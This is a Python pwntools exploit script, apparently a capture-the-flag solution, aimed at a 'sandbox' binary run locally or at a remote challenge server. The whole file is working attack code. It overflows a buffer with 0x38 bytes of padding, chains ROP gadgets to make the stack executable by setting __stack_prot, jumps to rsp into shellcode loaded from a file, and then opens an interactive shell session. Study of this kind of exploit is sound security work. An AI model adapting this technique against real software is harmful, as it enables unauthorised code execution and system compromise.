#!/usr/bin/env python

from pwn import *

context.arch = "amd64"

if (sys.argv[1] == "local"):
	r = process(argv=["./sandbox", "./program"])
else:
	r = remote("sandbox.chung96vn.cf", 1337)

elf = ELF("./program")
rop = ROP(elf)


#set __stack_prot = 7
rop.raw(next(elf.search(asm('pop rax; ret;'))))
rop.raw(7)
rop.raw(next(elf.search(asm('pop rdx; ret;'))))
rop.raw(0x6B8EF0)   #stack_prot
rop.raw(next(elf.search(asm('mov qword ptr [rdx], rax; ret;'))))

#set eax = addr of __libc_stack_end
rop.raw(next(elf.search(asm('pop rdi; ret;'))))
rop.raw(0x6B8AB0)
rop.raw(0x47F780)
rop.raw(next(elf.search(asm('jmp rsp'))))

shellcode = open("shellcode","rb").read()
payload = "A"*0x38 + str(rop) + shellcode
print len(payload)
#pause()
r.send(payload)
r.interactive()

